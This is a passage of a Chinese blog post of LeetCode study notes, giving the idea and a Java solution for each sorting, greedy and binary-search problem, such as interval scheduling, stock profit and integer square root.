class="markdownIt-Anchor" href="#思路-11"></a> 思路</h4><p>  原地排序，三向切分，用三个指针进行排序，中间指针用来遍历，左指针指向已拍好的0的位置，右指针指向已排好的2的位置，然后两面夹逼swap。</p><h4 id="代码-11"><a class="markdownIt-Anchor" href="#代码-11"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left=-<span class="number">1</span>,mid=<span class="number">0</span>,right=nums.length;</span><br><span class="line">        <span class="keyword">while</span>(mid&lt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                swap(nums,++left,mid++);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span>(nums[mid]==<span class="number">2</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    swap(nums,mid,--right);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                mid++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums,<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp=nums[i];</span><br><span class="line">        nums[i]=nums[j];</span><br><span class="line">        nums[j]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三-贪心"><a class="markdownIt-Anchor" href="#三-贪心"></a> 三、贪心</h2><p>  保证每次操作都是局部最优的，并且最后得到的结果是全局最优的。</p><h3 id="1-分配饼干"><a class="markdownIt-Anchor" href="#1-分配饼干"></a> 1. 分配饼干</h3><p>  <a href="https://leetcode-cn.com/problems/assign-cookies/">https://leetcode-cn.com/problems/assign-cookies/</a></p><h4 id="思路-12"><a class="markdownIt-Anchor" href="#思路-12"></a> 思路</h4><p>  要满足的孩子足够多，应从需求最低的孩子开始满足，这样可以用最小的代价来满足，从而使饼干可以满足更多的人。</p><p>  CYC给了证明：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">证明：假设在某次选择中，贪心策略选择给当前满足度最小的孩子分配第 m 个饼干，第 m 个饼干为可以满足该孩子的最小饼干。假设存在一种最优策略，给该孩子分配第 n 个饼干，并且 m &lt; n。我们可以发现，经过这一轮分配，贪心策略分配后剩下的饼干一定有一个比最优策略来得大。因此在后续的分配中，贪心策略一定能满足更多的孩子。也就是说不存在比贪心策略更优的策略，即贪心策略就是最优策略。</span><br></pre></td></tr></table></figure><h4 id="代码-12"><a class="markdownIt-Anchor" href="#代码-12"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findContentChildren</span><span class="params">(<span class="keyword">int</span>[] g, <span class="keyword">int</span>[] s)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(g);</span><br><span class="line">        Arrays.sort(s);</span><br><span class="line">        <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> gi=<span class="number">0</span>,si=<span class="number">0</span>;gi&lt;g.length&amp;&amp;si&lt;s.length;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s[si]&gt;=g[gi])</span><br><span class="line">            &#123;</span><br><span class="line">                count++;</span><br><span class="line">                si++;</span><br><span class="line">                gi++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                si++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-不重叠的区间个数"><a class="markdownIt-Anchor" href="#2-不重叠的区间个数"></a> 2. 不重叠的区间个数</h3><p>  <a href="https://leetcode-cn.com/problems/non-overlapping-intervals/">https://leetcode-cn.com/problems/non-overlapping-intervals/</a></p><h4 id="思路-13"><a class="markdownIt-Anchor" href="#思路-13"></a> 思路</h4><p>  按区间尾部排序，尾部越小，后面的剩余空间越大，可以放置的区间越多。<br />  排序后查找不重叠区间数，就是最大区间数，从而可得移除的最小区间数。</p><h4 id="代码-13"><a class="markdownIt-Anchor" href="#代码-13"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">eraseOverlapIntervals</span><span class="params">(<span class="keyword">int</span>[][] intervals)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(intervals.length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Arrays.sort(intervals,Comparator.comparingInt(o-&gt;o[<span class="number">1</span>]));</span><br><span class="line">        <span class="keyword">int</span> total=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> right=intervals[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;intervals.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(intervals[i][<span class="number">0</span>]&lt;right)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            right=intervals[i][<span class="number">1</span>];</span><br><span class="line">            total++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intervals.length-total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-投飞镖刺破气球"><a class="markdownIt-Anchor" href="#3-投飞镖刺破气球"></a> 3. 投飞镖刺破气球</h3><p>  <a href="https://leetcode-cn.com/problems/minimum-number-of-arrows-to-burst-balloons/">https://leetcode-cn.com/problems/minimum-number-of-arrows-to-burst-balloons/</a></p><h4 id="思路-14"><a class="markdownIt-Anchor" href="#思路-14"></a> 思路</h4><p>  同样是求不重叠区间数，有多少不重叠区间就要多少个飞镖。</p><h4 id="代码-14"><a class="markdownIt-Anchor" href="#代码-14"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMinArrowShots</span><span class="params">(<span class="keyword">int</span>[][] points)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span>(points.length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Arrays.sort(points,Comparator.comparingInt(o-&gt;o[<span class="number">1</span>]));</span><br><span class="line">        <span class="keyword">int</span> total=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> right=points[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;points.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(points[i][<span class="number">0</span>]&lt;=right)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            right=points[i][<span class="number">1</span>];</span><br><span class="line">            total++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-根据身高和序号重组队列"><a class="markdownIt-Anchor" href="#4-根据身高和序号重组队列"></a> 4. 根据身高和序号重组队列</h3><p>  <a href="https://leetcode-cn.com/problems/queue-reconstruction-by-height/">https://leetcode-cn.com/problems/queue-reconstruction-by-height/</a></p><h4 id="思路-15"><a class="markdownIt-Anchor" href="#思路-15"></a> 思路</h4><p>  按身高排序，相同身高按位置排序，位置大的在后面。<br />  然后开始重建队列，假设候选队列为 A，已经站好队的队列为 B。<br />  从 A 里挑身高最高的人 x 出来，插入到 B. 因为 B 中每个人的身高都比 x 要高，因此 x 插入的位置，就是看 x 前面应该有多少人就行了。比如 x 前面有 5 个人，那 x 就插入到队列 B 的第 5 个位置。</p><h4 id="代码-15"><a class="markdownIt-Anchor" href="#代码-15"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] reconstructQueue(<span class="keyword">int</span>[][] people) &#123;</span><br><span class="line">        <span class="keyword">if</span>(people==<span class="keyword">null</span>||people.length==<span class="number">0</span>||people[<span class="number">0</span>].length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        Arrays.sort(people,(a,b)-&gt;(a[<span class="number">0</span>]==b[<span class="number">0</span>]?a[<span class="number">1</span>]-b[<span class="number">1</span>]:b[<span class="number">0</span>]-a[<span class="number">0</span>]));</span><br><span class="line">        List&lt;<span class="keyword">int</span>[]&gt; res=<span class="keyword">new</span> ArrayList&lt;<span class="keyword">int</span>[]&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;people.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.add(people[i][<span class="number">1</span>],people[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toArray(<span class="keyword">new</span> <span class="keyword">int</span>[people.length][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-买卖股票最大的收益"><a class="markdownIt-Anchor" href="#5-买卖股票最大的收益"></a> 5. 买卖股票最大的收益</h3><p>  <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/submissions/">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/submissions/</a></p><h4 id="思路-16"><a class="markdownIt-Anchor" href="#思路-16"></a> 思路</h4><p>  遍历每一天的价格，保存到目前为止的最小值，然后判断当天卖出的收益，寻找收益最大值。</p><h4 id="代理"><a class="markdownIt-Anchor" href="#代理"></a> 代理</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> curmin=prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(curmin&gt;prices[i])</span><br><span class="line">                curmin=prices[i];</span><br><span class="line">            <span class="keyword">if</span>(prices[i]-curmin&gt;max)</span><br><span class="line">                max=prices[i]-curmin;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-买卖股票的最大收益-ii"><a class="markdownIt-Anchor" href="#6-买卖股票的最大收益-ii"></a> 6. 买卖股票的最大收益 II</h3><p>  <a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii/</a></p><h4 id="思路-17"><a class="markdownIt-Anchor" href="#思路-17"></a> 思路</h4><p>  借用CYC的说法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对于 [a, b, c, d]，如果有 a &lt;&#x3D; b &lt;&#x3D; c &lt;&#x3D; d ，那么最大收益为 d - a。而 d - a &#x3D; (d - c) + (c - b) + (b - a) ，因此当访问到一个 prices[i] 且 prices[i] - prices[i-1] &gt; 0，那么就把 prices[i] - prices[i-1] 添加到收益中。</span><br></pre></td></tr></table></figure><h4 id="代码-16"><a class="markdownIt-Anchor" href="#代码-16"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span>[] prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(prices==<span class="keyword">null</span>||prices.length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;prices.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(prices[i]-prices[i-<span class="number">1</span>]&gt;<span class="number">0</span>)</span><br><span class="line">                res+=prices[i]-prices[i-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-种植花朵"><a class="markdownIt-Anchor" href="#7-种植花朵"></a> 7. 种植花朵</h3><p>  <a href="https://leetcode-cn.com/problems/can-place-flowers/">https://leetcode-cn.com/problems/can-place-flowers/</a></p><h4 id="思路-18"><a class="markdownIt-Anchor" href="#思路-18"></a> 思路</h4><p>  有连续三个0就可以栽一个，所以针对每一位判断前后是否都是0，两头边界要增加一个判断。<br />  可以栽之后下一位不可再判断，要手动移位一次，或者把当前位置为1。</p><h4 id="代码-17"><a class="markdownIt-Anchor" href="#代码-17"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canPlaceFlowers</span><span class="params">(<span class="keyword">int</span>[] flowerbed, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(flowerbed==<span class="keyword">null</span>||flowerbed.length==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> n==<span class="number">0</span>?<span class="keyword">true</span>:<span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;flowerbed.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(flowerbed[i]==<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">int</span> pre=i==<span class="number">0</span>?<span class="number">0</span>:flowerbed[i-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> next=i==flowerbed.length-<span class="number">1</span>?<span class="number">0</span>:flowerbed[i+<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(pre==<span class="number">0</span>&amp;&amp;next==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                count++;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="comment">//flowerbed[i] = 1;往后移一位或者改为1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count&gt;=n)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-判断是否为子序列"><a class="markdownIt-Anchor" href="#8-判断是否为子序列"></a> 8. 判断是否为子序列</h3><p>  <a href="https://leetcode-cn.com/problems/is-subsequence/">https://leetcode-cn.com/problems/is-subsequence/</a></p><h4 id="思路-19"><a class="markdownIt-Anchor" href="#思路-19"></a> 思路</h4><p>  没弄明白这题放这干啥，不就是移动判断吗。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//手动实现的慢版本</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSubsequence</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> si=<span class="number">0</span>,ti=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(;si&lt;s.length()&amp;&amp;ti&lt;t.length();)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(si)==t.charAt(ti))</span><br><span class="line">            &#123;</span><br><span class="line">                si++;</span><br><span class="line">                ti++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ti++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(si!=s.length())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//借助indexOf实现的快版本</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSubsequence</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index=-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> ch=s.charAt(i);</span><br><span class="line">            index=t.indexOf(ch,index+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(index==-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-修改一个数成为非递减数组"><a class="markdownIt-Anchor" href="#9-修改一个数成为非递减数组"></a> 9. 修改一个数成为非递减数组</h3><p>  <a href="https://leetcode-cn.com/problems/non-decreasing-array/">https://leetcode-cn.com/problems/non-decreasing-array/</a></p><h4 id="思路-20"><a class="markdownIt-Anchor" href="#思路-20"></a> 思路</h4><p>  如果出现 a[i] &gt; a[i+1],改变一个数就面临两种选择：</p><ol><li>把a[i]变大</li><li>把a[i+1] 变小</li></ol><p>  而选择哪一种方式，还需要比较a[i-1] 与 a[i+1]的值。<br />  如果a[i-1]比a[i+1]小，则需要把夹在中间的较大的a[i]变小，使a[i]=a[i+1]。<br />  如果a[i-1]比a[i+1]大，则a[i-1],a[i]已经非递减，需要把a[i+1]=a[i],来保持非递减。<br />  改变完之后，记录改变次数，再检测是否升序。<br />  如果次数大于1，至少改了两次 返回false。<br />  先让前两个有序。<br />  因为没有左边没有数 所以对于前两个数来说，最佳选择就是把 a[0] 变小。<br />  此外还需要注意先确保前两个有序。</p><h4 id="代码-18"><a class="markdownIt-Anchor" href="#代码-18"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPossibility</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums.length&lt;<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">0</span>]&gt;nums[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            nums[<span class="number">0</span>]=nums[<span class="number">1</span>];</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.length-<span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i+<span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(nums[i-<span class="number">1</span>]&lt;nums[i+<span class="number">1</span>])</span><br><span class="line">                &#123;</span><br><span class="line">                    nums[i]=nums[i+<span class="number">1</span>];</span><br><span class="line">                    flag=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    nums[i+<span class="number">1</span>]=nums[i];</span><br><span class="line">                    flag=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-子数组最大的和"><a class="markdownIt-Anchor" href="#10-子数组最大的和"></a> 10. 子数组最大的和</h3><p>  <a href="https://leetcode-cn.com/problems/maximum-subarray/submissions/">https://leetcode-cn.com/problems/maximum-subarray/submissions/</a></p><h4 id="思路-21"><a class="markdownIt-Anchor" href="#思路-21"></a> 思路</h4><p>  O(n)的方法遍历一次，如果当前和已经小于0，则让其等于当前遍历值，否则加上当前遍历值。<br />  和Max比较，得最大值。</p><h4 id="代码-19"><a class="markdownIt-Anchor" href="#代码-19"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> cursum=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(cursum&lt;=<span class="number">0</span>)</span><br><span class="line">                cursum=nums[i];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                cursum+=nums[i];</span><br><span class="line">            <span class="keyword">if</span>(cursum&gt;max)</span><br><span class="line">                max=cursum;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-分隔字符串使同种字符出现在一起"><a class="markdownIt-Anchor" href="#11-分隔字符串使同种字符出现在一起"></a> 11. 分隔字符串使同种字符出现在一起</h3><p>  <a href="https://leetcode-cn.com/problems/partition-labels/">https://leetcode-cn.com/problems/partition-labels/</a></p><h4 id="思路-22"><a class="markdownIt-Anchor" href="#思路-22"></a> 思路</h4><p>  对于每一个字符，查找其最后出现位置last，然后从当前位置到last遍历字符，挨个查找最后出现位置last2，当last2比last大时，说明不能在last出分隔，用last2替换last。当一次子查询完成后，代表当前获得了一个可以分割的子串。</p><p><code>lastIndexOf(ch,index)的index是他娘的从后往前的索引，我以为是从前往后的，差点改疯了</code></p><h4 id="代码-20"><a class="markdownIt-Anchor" href="#代码-20"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">partitionLabels</span><span class="params">(String S)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (S == <span class="keyword">null</span> || S.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> start=<span class="number">0</span>;</span><br><span class="line">        List&lt;Integer&gt; res=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;S.length();)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> ch=S.charAt(i);</span><br><span class="line">            <span class="keyword">int</span> lastindex=S.lastIndexOf(ch);</span><br><span class="line">            <span class="keyword">if</span>(lastindex!=-<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(i++;i&lt;=lastindex;i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">char</span> ch2=S.charAt(i);</span><br><span class="line">                    <span class="keyword">int</span> lastindex2=S.lastIndexOf(ch2);</span><br><span class="line">                    <span class="keyword">if</span>(lastindex2&gt;lastindex)</span><br><span class="line">                        lastindex=lastindex2;</span><br><span class="line">                &#125;</span><br><span class="line">                res.add(i-start);</span><br><span class="line">                start=i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四-二分查找"><a class="markdownIt-Anchor" href="#四-二分查找"></a> 四、二分查找</h2><h3 id="1-求开方"><a class="markdownIt-Anchor" href="#1-求开方"></a> 1. 求开方</h3><p>  <a href="https://leetcode-cn.com/problems/sqrtx/submissions/">https://leetcode-cn.com/problems/sqrtx/submissions/</a></p><h4 id="思路-23"><a class="markdownIt-Anchor" href="#思路-23"></a> 思路</h4><p>  从1~X进行二分查找，判断平方与X的大小，并进行左右边界缩减。<br />  注意当左右相交还未找到x的平方根时，检查x的平方根与left的大小，如果x的平方根较大则取left，若left较大则取left-1</p><h4 id="代码-21"><a class="markdownIt-Anchor" href="#代码-21"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">1</span>,right=x;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(x/mid==mid)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span>(x/mid&gt;mid)</span><br><span class="line">                    left=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                right=mid-<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x/left&lt;left)</span><br><span class="line">            <span class="keyword">return</span> left-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-大于给定元素的最小元素"><a class="markdownIt-Anchor" href="#2-大于给定元素的最小元素"></a> 2. 大于给定元素的最小元素</h3><p>  <a href="https://leetcode-cn.com/problems/find-smallest-letter-greater-than-target/">https://leetcode-cn.com/problems/find-smallest-letter-greater-than-target/</a></p><h4 id="思路-24"><a class="markdownIt-Anchor" href="#思路-24"></a> 思路</h4><p>  常理来讲，二分查找，左右夹逼直到边界相交，如果到最后还没找到则直接输出最左。</p><h4 id="代码-22"><a class="markdownIt-Anchor" href="#代码-22"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">nextGreatestLetter</span><span class="params">(<span class="keyword">char</span>[] letters, <span class="keyword">char</span> target)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">int</span> n = letters.length;</span><br><span class="line">        <span class="keyword">int</span> l = <span 